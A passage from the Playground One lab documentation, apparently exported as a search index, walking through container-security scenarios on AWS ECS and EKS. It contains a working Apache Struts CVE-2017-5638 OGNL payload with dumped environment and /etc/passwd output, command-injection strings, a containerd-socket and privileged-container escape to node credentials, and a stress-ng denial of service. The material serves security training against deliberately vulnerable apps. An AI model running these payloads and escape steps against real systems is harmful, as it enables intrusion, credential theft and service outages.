</li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code># EC2\npgo --apply ecs-ec2\n\n# Fargate\npgo --apply ecs-fg\n</code></pre> <p>Ensure to have Runtime Security enabled on the Vision One Console for this cluster.</p> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/ecs/apache-struts-rce/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/ecs/apache-struts-rce/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"pgo-cnc-ecs-ec2\"\necs_ami_ec2 = \"ami-00a947e5cc1e6d3d3\"\nloadbalancer_dns_ec2 = \"pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/cloud-security/container-security/ecs/apache-struts-rce/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 18.195.245.32:80...\n* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)\n&gt; GET /todolist/todolist/ HTTP/1.1\n&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 \n&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; \nLD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\nECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5\nCATALINA_HOME=/usr/local/tomcat\nLANG=C.UTF-8\nHOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal\n...\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nmessagebus:x:101:101::/var/run/dbus:/bin/false\n* transfer closed with outstanding read data remaining\n* Closing connection 0\ncurl: (18) transfer closed with outstanding read data remaining\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Container Security Runtime Event:</p> <p></p>"},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/","title":"Scenario: Runtime Vulnerability Scanning","text":""},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster</li> </ul> <p>Ensure to have the ECS Cluster up and running:</p> <pre><code># EC2\npgo --apply ecs-ec2\n\n# Fargate\npgo --apply ecs-fg\n</code></pre> <p>Ensure to have Runtime Scanning enabled on the Vision One Console for this cluster.</p>"},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime in ECS clusters. The deployment of this scenario is based on a container image with plenty of different vulnerabilities.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> <li>Proof the finding by exploitation</li> </ul>"},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/#the-story","title":"The story","text":"<p>Every now and then new critical vulnerabilities are disclosed. A famous one with huge impact was the  vulnerability CVE-2017-5638. </p> <p>On March 6th 2017, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This vulnerability allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header. Written in Java, Apache Struts 2 is the popular open source web application framework. This is yet another incident that adds up to a long list of vulnerabilities in this framework.</p> <p>You want to search and validate for this specific vulnerability in your production environment.</p>"},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/#hints","title":"Hints","text":"<p>\u2728 Didn't find the vulnerable deployment?</p> <p>Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c</p>"},{"location":"scenarios/cloud-security/container-security/ecs/runtime-vulnerability/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"<p>Head over to Container Security --&gt; Container Protection --&gt; Vulnerabilities --&gt; ECS and search for the vulnerability <code>CVE-2017-5638</code>.</p> <p>Identify the vulnerable deployment/container on the ECS cluster(s)</p> <p></p> <p>Next step is to find out the load balancer address of the vulnerable service. The finding tells us (amongst others) the following:</p> <ul> <li>AWS Account ID: <code>634503960501</code></li> <li>AWS Region of the cluster: <code>eu-central-1</code></li> <li>Cluster name: <code>pgo-cnc-ecs-ec2</code></li> </ul> <p>With this, head over to your AWS console and access the ECS service in the region from above.</p> <p></p> <p>Click on the service name <code>pgo-cnc-ecs-ec2</code> since this provides the vulnerable container <code>goof</code>.</p> <p></p> <p>On the right, click on <code>[View Load Balancer]</code></p> <p></p> <p>This gives you the DNS name.</p> <pre><code>pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Now, verify the vulnerability by running:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <pre><code>[*] CVE: 2017-5638 - Apache Struts2 S2-045\n[*] cmd: cat /etc/passwd\n\nb'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n'\n</code></pre> <p>You proofed that the application server of your little goof application is vulnerable to CVE-2017-5638.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/","title":"Scenario: ContainerD Abuse","text":""},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: System Monitor</li> </ul> </li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but heavily adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#overview","title":"Overview","text":"<p>In this scenario, we will be focusing on the common and standard ways how to build systems and pipelines that leverage container sockets to create, build and run containers from the underlying container runtime. This has been exploited since the early days of the container ecosystem and even today we see these misconfigurations/use cases in the real world. </p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>You will learn to test and exploit the container UNIX socket misconfigurations</li> <li>Able to exploit container and escape out of the container</li> <li>Learn about ContainerD</li> <li>Learn common misconfigurations in pipelines and CI/CD build systems</li> </ul>"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#the-story","title":"The story","text":"<p>Most of the CI/CD and pipeline systems use the underlying host Docker runtime to build containers for you within the pipeline by using something called DIND (docker-in-docker) with a UNIX socket. Here in this scenario, we try to exploit a very similar misconfiguration and gain access to the host system by escaping out of the container.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_health_check&gt;</code></p>"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#goals","title":"Goals","text":"<p>The goal of this scenario is to escape out of the running container to the host system where the container is running and able to access and perform actions on the host system.</p> <p>Tip: If you are able to obtain containers running in the host system then you have completed this scenario. But definitely, you can advance beyond this exploitation as well by performing post-exploitation, e.g. spinning up an additional container.</p>"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#hints","title":"Hints","text":"Click here  \u2728 Do you know how to run multiple commands in Linux?  The application running here has command injection vulnerability. You can exploit this by using the ; delimiter when passing the input \ud83d\ude4c  \u2728 Able to run system commands, not sure how to access containers?  Identify the mounted UNIX socket volume, and use `ctr` binary to communicate with that with -H flag \ud83c\udf89"},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Start by checking that DNS resolution is working for your cluster. If this doesn't work, check to see if you have a DNS service like CoreDNS running on your cluster.  <pre><code>www.google.com\n</code></pre>  By looking at the application functionality and dabbling with the input and output, we can see it has standard command injection vulnerability. Assuming it's running in a Linux container we can use the `;` delimiter to run/pass other commands  <pre><code>127.0.0.1; id\n</code></pre>  As we can see it returns the response for the `id` command, now we can analyze the system and see what potential information we can obtain.  It contains `/containerd.sock` mounted into the file system as it's not available commonly in standard systems  <pre><code>; mount\n</code></pre>  Wow! We can see the `/custom/containerd/containerd.sock` mounted in the file system and assuming it's mounted from the host system we need to talk to it for communicating with the UNIX socket via gRPC.  Note: We can use multiple methods for communicating with the `containerd.sock` UNIX socket. Some of them include [official containerd binary](https://containerd.io/downloads/), or a simple `grpcurl` program as well.  The easiest way to interact with containerd is to use the `ctr` command. We can download the official `ctr` static binary from the internet [https://containerd.io/downloads/](https://containerd.io/downloads/).  Then download the appropriate containerd binary to the container. We can use the following command (takes some time, be patient).  <pre><code>; wget https://github.com/containerd/containerd/releases/download/v1.6.20/containerd-1.6.20-linux-amd64.tar.gz -O /tmp/containerd-1.6.20.tgz\n</code></pre>  We can extract the binary from the `containerd-1.6.20.tgz` file so that we can use that to talk to the UNIX socket  <pre><code>; tar -xvzf /tmp/containerd-1.6.20.tgz -C /tmp/ bin/ctr\n</code></pre>  Now we can access the host system by running the following containerd commands with passing `containerd.sock` containerd's gRPC server. Let's check what is running from kubernetes.  <pre><code>; /tmp/bin/ctr -a /custom/containerd/containerd.sock -n=k8s.io containers ls\n</code></pre>  Hooray \ud83e\udd73, now we can see that it has a lot of containers are running in the host system. We can now use different ctr commands to gain more access and further exploitation.  \ud83c\udf89 Success \ud83c\udf89  If you'd like to create containers now, try it. Be beware of the fact that the design of containerd is that clients should be local to the daemon. Running a client in a container is effectively non-local without some very specific configuration (which will vary depending on what you are trying to do)."},{"location":"scenarios/cloud-security/container-security/eks/dind-exploitation/#references","title":"References","text":"<ul> <li>Interacting with containerd runtime for kubernetes</li> </ul>"},{"location":"scenarios/cloud-security/container-security/eks/escape/","title":"Scenario: Escape to the Host System","text":""},{"location":"scenarios/cloud-security/container-security/eks/escape/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: System Monitor</li> </ul> </li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/escape/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/cloud-security/container-security/eks/escape/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/eks/escape/#overview","title":"Overview","text":"<p>This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Able to exploit the container and escape out of the docker container</li> <li>You will learn to test and exploit the misconfigured and privileged containers</li> <li>Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments</li> </ul>"},{"location":"scenarios/cloud-security/container-security/eks/escape/#the-story","title":"The story","text":"<p>Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_system_monitor&gt;</code></p>"},{"location":"scenarios/cloud-security/container-security/eks/escape/#goals","title":"Goals","text":"<p>The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.</p> <p>Tip: Gain access to the host system and obtain the node level kubeconfig file <code>/var/lib/kubelet/kubeconfig</code>, and query the Kubernetes nodes using the obtained configuration.</p>"},{"location":"scenarios/cloud-security/container-security/eks/escape/#hints","title":"Hints","text":"Click here  \u2728 Are you still in the container?  See the mounted file systems, also look the capabilities available for the container using capsh \ud83d\ude4c&lt;  \u2728 Escaped container?  You can recon the system, some interesting places to obtain the node level configuration are `/var/lib/kubelet/kubeconfig` and I hope you know how to query Kubernetes API for nodes? \ud83c\udf89"},{"location":"scenarios/cloud-security/container-security/eks/escape/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.  <pre><code>capsh --print\n</code></pre> <pre><code>mount\n</code></pre>  Now you can explore the mounted file system by navigating to the `/host-system` path  <pre><code>ls /host-system/\n</code></pre>  You can gain access to the host system privileges using `chroot`.  <pre><code>chroot /host-system bash\n</code></pre>  As you can see, now you can access all the host system resources like docker containers, configurations, etc.  Trying to use the docker client fails.  <pre><code>docker ps\n</code></pre> <pre><code>bash: docker: command not found\n</code></pre>  This does not work, since we're on a Kubernetes optimized node OS with no docker provided.  <pre><code>uname -a\n</code></pre> <pre><code>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre>  The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.  <pre><code>cat /var/lib/kubelet/kubeconfig\n</code></pre> <pre><code>apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority: /etc/kubernetes/pki/ca.crt\n    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n    user: kubelet\n  name: kubelet\ncurrent-context: kubelet\nusers:\n- name: kubelet\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1beta1\n      command: /usr/bin/aws-iam-authenticator\n      args:\n        - \"token\"\n        - \"-i\"\n        - \"playground-one-eks\"\n        - --region\n        - \"eu-central-1\"\n</code></pre>  Sadly, there is no `kubectl` as well.  <pre><code>kubectl\n</code></pre> <pre><code>bash: kubectl: command not found\n</code></pre>  Trying to use the package manager `yum` will not solve the problem. But navigating to https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux will help:  <pre><code>cd\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x kubectl\n</code></pre>  Try to get the available nodes of our cluster:  <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes \n</code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\n</code></pre>  Can you do more?  <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A\n</code></pre> <pre><code>NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE\ngoat                system-monitor-6dfbdbb7d-w6mdv                     1/1     Running   0          53m\nkube-system         aws-load-balancer-controller-577dcc6f77-sqtfr      1/1     Running   0          92m\nkube-system         aws-node-8wl6v                                     1/1     Running   0          92m\nkube-system         aws-node-ksdjv                                     1/1     Running   0          92m\nkube-system         cluster-autoscaler-6696cf9bff-2s52q                1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-hrwwl                            1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-kp266                            1/1     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-2w7r8                6/6     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-fdhfc                6/6     Running   0          92m\nkube-system         ebs-csi-node-k77sx                                 3/3     Running   0          92m\nkube-system         ebs-csi-node-vj6c7                                 3/3     Running   0          92m\nkube-system         kube-proxy-62dls                                   1/1     Running   0          92m\nkube-system         kube-proxy-mshz7                                   1/1     Running   0          92m\ntrendmicro-system   trendmicro-admission-controller-74d8d7f866-dv87r   1/1     Running   0          53m\ntrendmicro-system   trendmicro-oversight-controller-557df87c9-6c4dx    2/2     Running   0          69m\ntrendmicro-system   trendmicro-scan-manager-6ddb6f69b8-r85dk           1/1     Running   0          53m\ntrendmicro-system   trendmicro-scout-gkl4k                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-scout-tz68w                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-usage-controller-6944c5b55b-m8hgh       2/2     Running   0          53m\ntrendmicro-system   trendmicro-workload-operator-6cf5c98c6f-xq8bb      1/1     Running   0          69m\ntrivy-system        trivy-operator-57c774d7c4-hmnlk                    1/1     Running   0          53m\nvictims             java-goof-5878dd4dd-9lnst                          1/1     Running   0          53m\nvictims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m\n</code></pre> <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes \n</code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\n</code></pre>  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/","title":"Scenario: Hunger Check","text":""},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Playground One Scenarios<ul> <li>Running app: Hunger Check</li> </ul> </li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre> <p>We will use the Kubernetes Metrics Server which is an aggregator of resource usage data in our cluster. The Metrics Server isn't deployed by default in Amazon EKS clusters. To deploy it run</p> <pre><code>kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#overview","title":"Overview","text":"<p>Availability is one of the triads in CIA. One of the core problems solved by Kubernetes is the management of the resources like autoscaling, rollouts, etc. In this scenario, we will see how attackers can leverage and gain access to more resources or cause an impact on the availability of the resources by performing the DoS (Denial of Service) if there were no resource management configurations implemented on the cluster resources like memory and CPU requests and limits.</p> <p>By the end of the scenario, we will understand and learn the following</p> <ul> <li>Learn to perform the DoS on computing and memory resources using stress-ng</li> <li>Understand the Kubernetes resources management for pods and containers</li> <li>Explore the Kubernetes resource monitoring using the metrics and information</li> </ul>"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#the-story","title":"The story","text":"<p>There is no specification of resources in the Kubernetes manifests and no applied limit ranges for the containers. As an attacker, we can consume all the resources where the pod/deployment running and starve other resources and cause a DoS for the environment.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_hunger_check&gt;</code></p>"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#goals","title":"Goals","text":"<p>Access more resources than intended for this pod/container by consuming 2GB of memory to successfully complete the scenario.</p> <p>Tip: If you are able to obtain containers running in the host system then you have completed this scenario. But definitely, you can advance beyond this exploitation as well by performing post-exploitation, e.g. spinning up an additional container.</p>"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#hints","title":"Hints","text":"Click here  \u2728 How can I DoS resources?  You can leverage the popular command line utility like stress-ng \ud83d\ude4c"},{"location":"scenarios/cloud-security/container-security/eks/hunger-check/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  This deployment pod has not set any resource limits in the Kubernetes manifests. So we can easily perform a bunch of operations that can consume more resources.  We can use simple utilities like stress-ng to perform stress testing like accessing more resources. The below command is to access more resources than specified.  <pre><code>root@hunger-check-655dfcd8b9-bcfgq:/# stress-ng --vm 2 --vm-bytes 2G --timeout 30s\n</code></pre> <pre><code>stress-ng: info:  [41] dispatching hogs: 2 vm\nstress-ng: info:  [41] successful run completed in 30.09s\nroot@hunger-check-655dfcd8b9-bcfgq:/# \n</code></pre>  You can see the difference between the normal resources consumption vs while running stress-ng where it consumes a lot of resources than it intended to consume. Run the following command in your local/Cloud9 shell:  <pre><code>watch kubectl --namespace goat top pod $(kubectl -n goat get pods --selector=app=hunger-check -o jsonpath='{.items[0].metadata.name}')\n</code></pre>  ***DANGER***  This attack may not work in some cases like autoscaling, resource restrictions, etc. Also, it may cause more damage when autoscaling is enabled and more resources are created. This could lead to more expensive bills by the cloud provider or impacting the availability of the resources and services.  Hooray \ud83e\udd73, now we can see that it can consume more resources than intended which might affect the resource availability and also increase billing.  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/cloud-security/container-security/eks/istio/","title":"Scenario: Playing with Istio Service Mesh","text":"<p>Draft</p> <p>NOT FINISHED YET</p>"},{"location":"scenarios/cloud-security/container-security/eks/istio/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> </ul> <p>Verify, that you have <code>Deploy Istio</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nSection: Kubernetes Deployments\nPlease set/update your Integrations configuration\n...\nDeploy Istio? [true]:\n...\n</code></pre> <p>Then, create the PGO EKS-EC2 cluster by running</p> <pre><code>pgo --apply eks-ec2\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/istio/#add-ons","title":"Add-Ons","text":"<p>The Playground One provides a functional but basic Istio configuration only, yet. Since we want to get a little experience with it we deploy some of the most commonly used add-ons by running the commands below:</p> <pre><code># Install Istio add-ons Kiali, Jaeger, Prmetheus, and Grafana\nfor ADDON in kiali jaeger prometheus grafana \ndo \n   ADDON_URL=\"https://raw.githubusercontent.com/istio/istio/1.22.3/samples/addons/$ADDON.yaml\" \n   kubectl apply -f $ADDON_URL\ndone\n</code></pre> <p>Access Kiali</p> <pre><code>kubectl port-forward svc/kiali 20001:20001 -n istio-system --address 0.0.0.0 &amp;\n</code></pre> <p>Use your browser to navigate to http://localhost:20001. You can replace localhost with the IP of your PGO server, if you need to.</p>"},{"location":"scenarios/cloud-security/container-security/eks/istio/#get-your-shovel","title":"Get your Shovel","text":"<p>To play with Istio we're using an AWS sample application for now. To deploy it run:</p> <pre><code># Setup Namespace for Istio Mesh\ncd ${ONEPATH}/experimenting/istio/istio-on-eks/modules/01-getting-started\n\nkubectl create namespace workshop\nkubectl label namespace workshop istio-injection=enabled\n\n# Deploy sample app\nhelm install mesh-basic . -n workshop\n</code></pre> <p>The application\u2019s (user interface) URL can be retrieved using the following command:</p> <pre><code>ISTIO_INGRESS_URL=$(kubectl get svc istio-ingressgateway -n istio-system -o jsonpath='{.status.loadBalancer.ingress[*].hostname}')\necho \"http://$ISTIO_INGRESS_URL\"\n</code></pre> <p>Accessing this URL in the browser will lead you to the Product Catalog application as shown here:</p> <p></p>"},{"location":"scenarios/cloud-security/container-security/eks/istio/#generating-traffic","title":"Generating Traffic","text":"<p>Let\u2019s generate some traffic for our application. Use the siege command line tool to generate traffic to the application\u2019s (user interface) URL by running the following commands in a separate terminal session.</p> <p>If you get a <code>command not found</code> you need to install <code>siege</code> first.</p> <pre><code>sudo apt update\nsudo apt install siege -y\n</code></pre> <p>Now run</p> <pre><code>ISTIO_INGRESS_URL=$(kubectl get svc istio-ingressgateway -n istio-system -o jsonpath='{.status.loadBalancer.ingress[*].hostname}')\n\n# Generate load for 2 minute, with 5 concurrent threads and with a delay of 10s between successive requests\nsiege http://$ISTIO_INGRESS_URL -c 5 -d 10 -t 2M\n</code></pre> <p>And check the traffic graph in kiali.</p> <p></p>"},{"location":"scenarios/cloud-security/container-security/eks/istio/#grafana","title":"Grafana","text":"<p>Grafana allows you to query, visualize, alert on and understand your metrics no matter where they are stored.</p> <p>Access Grafana</p> <pre><code>kubectl port-forward svc/grafana 3000:3000 -n istio-system --address 0.0.0.0 &amp;\n</code></pre> <p>Use your browser to navigate to http://localhost:3000/dashboards. You can replace localhost with the IP of your PGO server, if you need to.</p> <p></p> <p>Navigate into each of the provided Dashboards by clicking on the names as shown in this image. For example, when you navigate to the Istio Control Plane Dashboard you should see a dashboard similar to the image shown here.</p> <p>Control Plane Dashboard monitors the health and performance of the control plane. Use this link to get details on all dashboards available out of the box: https://istio.io/latest/docs/ops/integrations/grafana/.</p>"},{"location":"scenarios/cloud-security/container-security/eks/istio/#cleanup","title":"Cleanup","text":"<pre><code>helm uninstall mesh-basic -n workshop\nkubectl delete namespace workshop\n\nfor ADDON in kiali jaeger prometheus grafana \ndo \n   ADDON_URL=\"https://raw.githubusercontent.com/istio/istio/1.22.3/samples/addons/$ADDON.yaml\" \n   kubectl delete -f $ADDON_URL\ndone\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-violations/","title":"Scenario: Vision One Container Security Generate Runtime Violations","text":""},{"location":"scenarios/cloud-security/container-security/eks/runtime-violations/#prerequisites","title":"Prerequisites","text":"<ul> 